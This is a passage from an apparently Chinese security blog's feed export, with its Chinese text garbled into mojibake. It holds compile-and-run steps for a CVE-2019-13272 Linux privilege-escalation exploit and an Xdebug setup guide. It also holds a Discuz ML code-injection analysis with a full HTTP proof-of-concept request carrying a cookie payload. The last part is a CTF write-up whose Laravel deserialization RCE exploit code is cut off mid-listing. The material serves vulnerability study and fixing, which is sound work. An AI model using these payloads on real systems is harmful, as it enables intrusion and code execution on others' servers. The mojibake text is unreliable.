<figure class="highlight stan"><table><tr><td class="code"><pre><span class="line">gcc cve-<span class="number">2019</span>-<span class="number">13272</span>_<span class="built_in">exp</span>.c -o <span class="built_in">exp</span></span><br><span class="line">./<span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8418106-2949b6bf609d4912.png" alt></p>
<p>ç›®å‰Linuxå·²ç»æä¾›ä¿®å¤è¡¥ä¸ï¼Œä¸‹è½½åœ°å€ï¼š<br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee</a><br>æ¼æ´ç›¸å…³ä¿¡æ¯ï¼š<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a></p>
]]></content>
      <categories>
        <category>æ°´æ»´éšç¬”</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ææƒ</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsä¸‹ PHPstorm + Xdebug åŠ¨æ€è°ƒè¯•ç¯å¢ƒé…ç½®</title>
    <url>/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>é…ç½®æœ¬åœ°çš„phpstorm + XdebugåŠ¨æ€ç¯å¢ƒçœŸçš„æ˜¯ä¸€ä¸ªç³Ÿå¿ƒçš„äº‹ï¼Œä¹‹å‰ä¸€ç›´å‡ºé—®é¢˜ï¼Œç°åœ¨é‡æ–°é…ç®€å•çš„è®°å½•ä¸‹ï¼Œæœ¬åœ°çš„phpç¯å¢ƒæ˜¯ç”¨phpstudyå®ç°ï¼Œå„ä¸ªç‰ˆæœ¬éƒ½é»˜è®¤å¸¦æœ‰xdebugæ’ä»¶ï¼Œphp.iniä¸­é…ç½®è°ƒç”¨å°±å¥½ã€‚</p>
<h3 id="0x01-php-inié…ç½®"><a href="#0x01-php-inié…ç½®" class="headerlink" title="0x01 php.inié…ç½®"></a>0x01 php.inié…ç½®</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span>=<span class="string">"D:\PhpStudy2018\PHPTutorial\php\php-7.0.12-nts\ext\php_xdebug.dll"</span> //xdebug.dllç‰©ç†åœ°å€</span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br></pre></td></tr></table></figure>
<h3 id="0x02-PHPstormé…ç½®"><a href="#0x02-PHPstormé…ç½®" class="headerlink" title="0x02 PHPstormé…ç½®"></a>0x02 PHPstormé…ç½®</h3><p>1ï¼‰File | Settings | Languages &amp; Frameworks | PHP</p>
<p>é…ç½®å¯¹åº”çš„phpç‰ˆæœ¬</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-e58a871c23d738c4.png" alt></p>
<p>æ¥ç€é…ç½®ä¸€ä¸‹PHP.exeçš„è·¯å¾„å’Œxdebugæ’ä»¶çš„è·¯å¾„</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-074d644b4d8cb233.png" alt></p>
<p>2ï¼‰File | Settings | Languages &amp; Frameworks | PHP | Debug</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-d0dd831cea12f1da.png" alt></p>
<p>3ï¼‰File | Settings | Languages &amp; Frameworks | PHP | Debug | DBGp Proxy</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-024fc91bcfc88518.png" alt></p>
<p>4ï¼‰File | Settings | Languages &amp; Frameworks | PHP | Servers</p>
<p>é…ç½®Hostä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯webæœåŠ¡ä¿¡æ¯ï¼ˆUse path mappingsä¹Ÿå¯ä»¥ç‚¹ä¸Šï¼Œæœ‰äº›æ–‡ä»¶æ‰¾ä¸åˆ°è·¯ç”±å…³ç³»ï¼‰</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-0b4f4b1264581428.png" alt></p>
<p>5ï¼‰Run | Edit Configurations -&gt; Add New Configurations</p>
<p>æ·»åŠ ä¸€ä¸ªPHP Web Pageé¡µé¢ï¼Œé…ç½®å¥½ç›¸å…³çš„Configurationä¿¡æ¯ï¼Œä¸ªäººä¹ æƒ¯ç”¨Chrome</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-acf8b3fe5ef87b57.png" alt></p>
<h3 id="0x03-Chromeæ’ä»¶é…ç½®"><a href="#0x03-Chromeæ’ä»¶é…ç½®" class="headerlink" title="0x03 Chromeæ’ä»¶é…ç½®"></a>0x03 Chromeæ’ä»¶é…ç½®</h3><p>Chromeæµè§ˆå™¨å®‰è£… Xdebug helper æ’ä»¶ï¼ŒIDE keyé…ç½®æˆPhpStormå°±OK</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-0e9ace0c49a2ac02.png" alt></p>
<p>åˆ°è¿™é‡Œå°±éƒ½é…ç½®å®Œæ¯•äº†ï¼ŒåŠ¨è°ƒçš„æ—¶å€™åœ¨ç›¸å…³é¡µé¢ä¸‹å¥½æ–­ç‚¹ï¼ŒChromeçš„ Xdebug helper å¼€å¯debugæ¨¡å¼ï¼Œphpstormæ‰“å¼€ç›‘å¬æ¨¡å¼ï¼ˆå³ä¸Šè§’çš„å°ç”µè¯ï¼‰</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-bb11cb631168cede.png" alt></p>
]]></content>
      <categories>
        <category>æ°´æ»´éšç¬”</category>
      </categories>
      <tags>
        <tag>ç¯å¢ƒæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>Discuz ML V3.x ä»£ç æ³¨å…¥æ¼æ´è¯¦ç»†åˆ†æ</title>
    <url>/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>7æœˆ11å·Discuz MLè¢«çˆ†å‡ºå­˜åœ¨ä»»æ„ä»£ç æ³¨å…¥æ¼æ´ï¼ŒDiscuzåœ¨å›½å†…çš„ç”¨æˆ·é‡è¿˜æ˜¯å¾ˆå¯è§‚çš„ï¼Œå›½å¤–è¿˜æ²¡æœ‰å»å…³æ³¨ï¼Œä»å®˜æ–¹ä¸‹è½½æºç å¯¹æ¼æ´çš„åŸç†è¯¦ç»†çš„åˆ†æäº†ä¸€ä¸‹ï¼Œæºç åœ°å€(<a href="http://discuz.ml/downloadï¼‰" target="_blank" rel="noopener">http://discuz.ml/downloadï¼‰</a></p>
<h1 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h1><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="attr">q=0.9,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;<span class="attr">q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">127.0</span>.<span class="number">0.1</span>/CMS/discuz.ml/vot-discuz.ml-fa108dcc726d/upload/install/index.php?<span class="attr">method=ext_info&amp;language=sc</span></span><br><span class="line">Cookie: <span class="attr">UM_distinctid=16961881c34a-0be7f060296b93-173b7740-1a9640-16961881c35265;</span> <span class="attr">CNZZDATA5770257=cnzz_eid%3D1356317550-1552119465-%26ntime%3D1554215107;</span> ECS[visit_times]=<span class="number">11</span>; <span class="attr">CNZZDATA1257137=cnzz_eid%3D591241165-1552785038-%26ntime%3D1552785038;</span> <span class="attr">GK9p_2132_saltkey=ek5JjJGL;</span> <span class="attr">GK9p_2132_lastvisit=1562973338;</span> <span class="attr">GK9p_2132_sid=SW5SHK;</span> <span class="attr">GK9p_2132_lastact=1562977009%09forum.php%09;</span> <span class="attr">O2FL_2132_saltkey=ao6mCm4C;</span> <span class="attr">O2FL_2132_language=sc%27.phpinfo().%27;</span> <span class="attr">O2FL_2132_lastvisit=1562973840;</span> <span class="attr">O2FL_2132_sid=MVTcHf;</span> <span class="attr">O2FL_2132_lastact=1562977475%09index.php%09;</span> <span class="attr">O2FL_2132_sendmail=1;</span> <span class="attr">O2FL_2132_onlineusernum=1</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Cache-Control: <span class="attr">max-age=0</span></span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">O2FL_2132_language</span>=sc%<span class="number">27</span>.phpinfo().%<span class="number">27</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h1><p>è¿™é‡Œåˆ†æDiscuz ML v3.4æºç ï¼Œè¯¥æ¼æ´ä¸»è¦æ˜¯é€šè¿‡æ§åˆ¶ç¼“å­˜æ–‡ä»¶çš„å†…å®¹ï¼Œä¹‹åç¼“å­˜æ–‡ä»¶åˆè¢«ç³»ç»Ÿè°ƒç”¨ä»è€Œè§¦å‘ï¼Œæ ¹æ®POCå¯çŸ¥æ˜¯é€šè¿‡æ„é€ Cookieä¸­languageçš„å€¼è¿›è¡Œä»£ç æ³¨å…¥ï¼Œåœ¨languageä¸­æ„é€ é”™è¯¯ä»£ç åˆ¤æ–­æ¼æ´è§¦å‘æ–‡ä»¶ã€‚<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-5546b002e81634b2.png" alt>)éƒ½æ˜¯require()å’Œinclude()æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯åŒ…æ¶µçš„æ–‡ä»¶å‡ºäº†é—®é¢˜ï¼Œåˆ°forum_index.phpä¸­æŸ¥çœ‹ä¸€ä¸‹<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-87b0c63cbf32bc4f.png" alt></p>
<p>è¿™é‡Œæ˜¯è°ƒç”¨ç¼“å­˜æ–‡ä»¶ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯å¯ä»¥çŸ¥é“å¯¼è‡´æŠ¥é”™çš„ç¼“å­˜æ–‡ä»¶æ˜¯ï¼šdata/template/scâ€™<em>1</em>1_common_header_forum_index.tpl.phpï¼Œå¾ˆæ˜æ˜¾æ–‡ä»¶åä¸­æœ‰éƒ¨åˆ†ç‰‡æ®µæ˜¯å–è‡ªlanguageçš„å€¼ï¼ŒåŒæ—¶ä¹Ÿå°±æ˜¯è¯´æ„é€ çš„POCä¼šè¢«æ¤å…¥åˆ°ç¼“å­˜æ–‡ä»¶ä¸­ï¼Œè·Ÿè¿›åˆ°template()ä¸­æŸ¥çœ‹ç¼“å­˜æ–‡ä»¶çš„ç”Ÿæˆè§„åˆ™(function_code.php 644è¡Œ)<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-d4405e372a735f5a.png" alt></p>
<p>å¾ˆæ˜æ˜¾ï¼Œç¼“å­˜æ–‡ä»¶çš„å‘½åè§„åˆ™ç”±å¤šéƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­ç¬¬ä¸€éƒ¨åˆ†åŒºè‡ªDISCUZ_LANGï¼Œæ ¹æ®å‰é¢çš„æŠ¥é”™ä¿¡æ¯ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå˜é‡çš„å€¼ä¹Ÿå°±æ˜¯Cookieä¸­languageå­—æ®µçš„å€¼ï¼Œè¯¥å‡½æ•°æœ€ç»ˆè¿”å›DISCUZ_ROOT.$cachefileï¼Œå¯æƒ³è€ŒçŸ¥ï¼Œæœ€ç»ˆè¿”å›çš„ä¾¿æ˜¯ç¼“å­˜æ–‡ä»¶è·¯åŠ²ç”¨äºæ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œè¿½æº¯ä¸€ä¸‹DISCUZ_LANGï¼ˆdiscuz_application.phpå®šä¹‰ï¼‰<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-778fad6fd153991e.png" alt></p>
<p>DISCUZ_LANGçš„å€¼å–è‡ªäºå˜é‡$lngï¼Œå˜é‡$lngçš„å€¼å–è‡ªäºcookie language</p>
<p><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-b1ecc65c366bae82.png" alt></p>
<p>å¾ˆæ˜æ˜¾languageå­—æ®µçš„å€¼æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ç›´æ¥ä¼ åˆ°äº†å˜é‡$lngçš„å€¼ï¼Œç›´æ¥ç”¨è¯¥å­—æ®µå¯¹ç¼“å­˜æ–‡ä»¶è¿›è¡Œå‘½åï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´è¯¥æ¼æ´è§¦å‘çš„ç›´æ¥åŸå› ã€‚<br>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹æ³¨å…¥çš„ä»£ç æ˜¯å¦‚ä½•æ¤å…¥åˆ°ç¼“å­˜æ–‡ä»¶ä¸­çš„ï¼Œå®šä½åˆ°templateç±»è¿›è¡Œåˆ†æï¼ˆclass_template.phpï¼‰ï¼Œåœ¨Discuzç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šè¯»å–template/default/common/ç›®å½•ä¸‹çš„é»˜è®¤æ¨¡ç‰ˆ<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-a287539e7addd13b.png" alt></p>
<p>æ¨¡ç‰ˆè¯»å–çš„å†…å®¹ä¼ å…¥åˆ°å˜é‡$templateä¸­ï¼Œå¹¶å¯¹$templateè¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢æ“ä½œ</p>
<p><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-d94578bccb4b9a6f.png" alt></p>
<p>å…³é”®ç‚¹åœ¨äºå˜é‡$header</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$headeradd</span> .= <span class="string">"|| checktplrefresh('<span class="variable">$tplfile</span>', '<span class="variable">$fname</span>', "</span>.time().<span class="string">", '<span class="variable">$templateid</span>', '<span class="variable">$cachefile</span>', '<span class="variable">$tpldir</span>', '<span class="variable">$file</span>')\n"</span>;</span><br></pre></td></tr></table></figure>
<p>å°†checktplrefreshä¹Ÿå†™å…¥åˆ°ç¼“å­˜æ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶å†…å®¹ç±»å‹äº</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="keyword">if</span>(!defined(<span class="string">'IN_DISCUZ'</span>)) <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>); </span><br><span class="line"><span class="number">0</span></span><br><span class="line">|| checktplrefresh(<span class="string">'./template/default/common/xxx'</span>, <span class="string">'./template/default/common/xxx'</span>, <span class="number">1562977476</span>, <span class="string">'1'</span>, <span class="string">'./data/template/[$cachefile]'</span>, <span class="string">'./template/default'</span>, <span class="string">'common/xxx'</span>)</span><br><span class="line">;?&gt;</span><br></pre></td></tr></table></figure>
<p>ç»“åˆä¸Šé¢çš„åˆ†æï¼Œå…¶ä¸­å˜é‡$cachefileæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ§åˆ¶ç”Ÿæˆçš„æ¶æ„å˜é‡åä¼šè¢«å½“ä½œå˜é‡å€¼å†™å…¥åˆ°ç¼“å­˜æ–‡ä»¶ä¸­ï¼Œåˆ«åˆ‡æ°å¥½ç¼“å­˜æ–‡ä»¶ä¼šæ‹…å­template()å‡½æ•°çš„è¿”å›å€¼ç›´æ¥è¢«åŒ…æ¶µè°ƒç”¨ï¼Œè¿™å°±å¤ªå®Œç¾äº†ï¼Œç»“åˆä¸€ä¸‹ä»£ç æ‹¼æ¥ï¼Œæ‰€ä»¥ç›´æ¥åœ¨languageå­—æ®µæ„é€ ä»»æ„ä»£ç ï¼Œä¾‹å¦‚<code>sc&#39;.phpinfo().&#39;</code>(scä¹Ÿå¯ä»¥ä¸è¦)ï¼ŒæŸ¥çœ‹ç”Ÿæˆçš„ç¼“å­˜æ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-ef036968e1375f53.png" alt><br>ç”±äºä»£ç åŒ…å«çš„åŸå› ï¼Œæ‰€ä»¥æ³¨å…¥åˆ°ç¼“å­˜æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç ç›´æ¥æ‰§è¡Œï¼Œå…¶ä¸­é¦–é¡µå°±æœ‰åŒ…æ¶µï¼Œå…¨å±€æœç´¢ä¸€ä¸‹çš„è¯ï¼Œåº”è¯¥æœ‰ä¸å°‘åœ°æ–¹æœ‰è¿›è¡ŒåŒ…å«å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚</p>
<h1 id="0x03-ä¿®å¤å»ºè®®"><a href="#0x03-ä¿®å¤å»ºè®®" class="headerlink" title="0x03 ä¿®å¤å»ºè®®"></a>0x03 ä¿®å¤å»ºè®®</h1><p>ç¼“å­˜ç¼“æ–‡ä»¶åå›ºå®šå³å¯ï¼ŒåŠ è¿‡æ»¤çš„è¯ä¹Ÿå¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚</p>
<h5 id="ç”±äºæ˜¯ä»»æ„ä»£ç æ³¨å…¥æ¼æ´ï¼Œè€Œä¸”æ¼æ´åˆ©ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œè€Œä¸”å›½å†…discuzçš„è®ºå›è¾ƒå¤šï¼Œæ‰€ä»¥å½±å“ä¼šå¾ˆå¤§ã€‚"><a href="#ç”±äºæ˜¯ä»»æ„ä»£ç æ³¨å…¥æ¼æ´ï¼Œè€Œä¸”æ¼æ´åˆ©ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œè€Œä¸”å›½å†…discuzçš„è®ºå›è¾ƒå¤šï¼Œæ‰€ä»¥å½±å“ä¼šå¾ˆå¤§ã€‚" class="headerlink" title="ç”±äºæ˜¯ä»»æ„ä»£ç æ³¨å…¥æ¼æ´ï¼Œè€Œä¸”æ¼æ´åˆ©ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œè€Œä¸”å›½å†…discuzçš„è®ºå›è¾ƒå¤šï¼Œæ‰€ä»¥å½±å“ä¼šå¾ˆå¤§ã€‚"></a>ç”±äºæ˜¯ä»»æ„ä»£ç æ³¨å…¥æ¼æ´ï¼Œè€Œä¸”æ¼æ´åˆ©ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œè€Œä¸”å›½å†…discuzçš„è®ºå›è¾ƒå¤šï¼Œæ‰€ä»¥å½±å“ä¼šå¾ˆå¤§ã€‚</h5>]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´åˆ†æä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯å†³èµ›RWçš„3ä¸ªWebé¢˜</title>
    <url>/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/</url>
    <content><![CDATA[<p><strong>è¿™æ¬¡çœŸçš„æ˜¯ç¥ä»™æ‰“æ¶ï¼Œwebç‹—æ— å¤„è‹Ÿæ´»ï¼ŒAWDåªæœ‰PWNé¢˜ï¼Œæ‰€ä»¥Webç‹—åªèƒ½å¥‹åŠ›æ€¼RWçš„3ä¸ªwebï¼Œè¿™é‡Œä¸å¾—ä¸è†œä¸€ä¸‹å¤§å¸ˆå‚…ä»¬ï¼Œå®¡å¾—å¤ªå¿«äº†ï¼Œç¬¬äºŒå¤©æ’é˜Ÿæ’å¤ªä¹…ï¼Œå•¥è¡€ä¹Ÿæ²¡æŠ¢åˆ°ï¼Œç®€å•å†™ä¸‹3ä¸ªwebçš„è§£é¢˜æ€è·¯â€¦â€¦è¿™é‡Œæ”¾ä¸‹æºç ï¼Œæ–¹ä¾¿å¤ç°ï¼ˆ<a href="https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g" target="_blank" rel="noopener">https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g</a> æå–ç : kj7bï¼‰</strong></p>
<h1 id="0x01-laravel"><a href="#0x01-laravel" class="headerlink" title="0x01 laravel"></a>0x01 laravel</h1><p>è¿™ä¸ªä¸‹å‘çš„ç‰ˆæœ¬æ˜¯5.7ï¼Œå¹¶ä¸”ä¹‹å‰æœ‰äººå‘è¡¨è¿‡å¯¹è¯¥ç‰ˆæœ¬çš„æ¼æ´çš„åˆ†ææ–‡ç« ï¼Œæ‰€ä»¥è¿™é¢˜å·®ä¸å¤šç®—æ˜¯ä¸€ä¸ªwebç­¾åˆ°é¢˜ï¼Œè¿™é‡Œè´´ä¸€ä¸‹é“¾æ¥:<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a><br>åœ¨å†™è¿™ä¸ªåˆ†ææ–‡ç« çš„æ—¶å€™ï¼Œå¤§å¸ˆå‚…å¯èƒ½é¿å«ŒæŠŠè¿™ä¸ªé¡µé¢å…³äº†ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¨‹åºæµå¤„ç†è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶åºåˆ—åŒ–çš„å†…å®¹ï¼Œæ‰€ä»¥åªè¦æ„é€ ä¸€ä¸ªååºåˆ—åŒ–ç‚¹å°±å¯ä»¥è§¦å‘è¯¥ååºåˆ—RCEæ¼æ´ï¼Œåˆšå¥½è¿™ä¸ªé¢˜ç›®çš„è®¾å®šå°±æ˜¯ç»™äº†ååºåˆ—åŒ–ç‚¹çš„ã€‚<br>/public/index.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace App\Http\Controllers;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TaskController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">            unserialize($code);</span><br><span class="line">            return &quot;Welcome to qiangwangbei!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç»™äº†ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ç‚¹æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠåºåˆ—åŒ–çš„å†…å®¹èµ‹ç»™codeå‚æ•°å°±å¯ä»¥äº†ï¼Œç›´æ¥è´´Expä»£ç ï¼ˆåæ­£ä¹Ÿä¸æ˜¯æˆ‘å†™çš„,å› ä¸ºèµ›åˆ¶è¦æ±‚æ‹¿åˆ°shellï¼Œè€Œä¸”åªæœ‰<strong>index.php</strong>å¯å†™ï¼Œè¿™ä¸ªåœ°æ–¹å‘äº†æˆ‘çš„ç¬¬ä¸€æ¬¡æœºä¼šï¼Œåæ§½ä¸€ä¸‹ï¼‰<br><strong>get.php</strong>ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $command;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $parameters;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $app;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $test;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span></span><br><span class="line"><span class="php">	    &#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;command = $command;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;test=$class;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;app=$app;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">GenericUser</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $attributes;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span></span><br><span class="line"><span class="php">	